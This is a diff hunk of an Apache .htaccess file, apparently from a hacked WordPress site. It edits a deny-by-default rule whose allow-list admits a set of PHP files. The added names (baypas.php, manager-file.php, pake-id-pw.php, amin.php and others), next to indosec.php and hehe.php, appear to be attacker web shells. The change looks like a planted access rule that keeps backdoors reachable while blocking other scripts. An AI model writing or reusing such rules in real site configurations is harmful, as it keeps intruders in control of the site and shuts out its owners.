@@ -10,7 +10,7 @@ RewriteRule . index.php [L]
 Order Allow,Deny
 Deny from all
 </FilesMatch>
-<FilesMatch "^(index.php|credits.php|wp-login.php|wp-blog-loader.php|main.php|cha-kwetiaw.php|indosec.php|wp-blog.php|404.php|hehe.php|wp-load.php|css.php|)$">
+<FilesMatch "^(index.php|credits.php|wp-login.php|wp-blog-loader.php|main.php|baypas.php|indosec.php|wp-blog.php|anti-male.php|hehe.php|wp-load.php|manager-file.php|pake-id-pw.php|amin.php|)$">
 Order Allow,Deny
 Allow from all
 </FilesMatch>
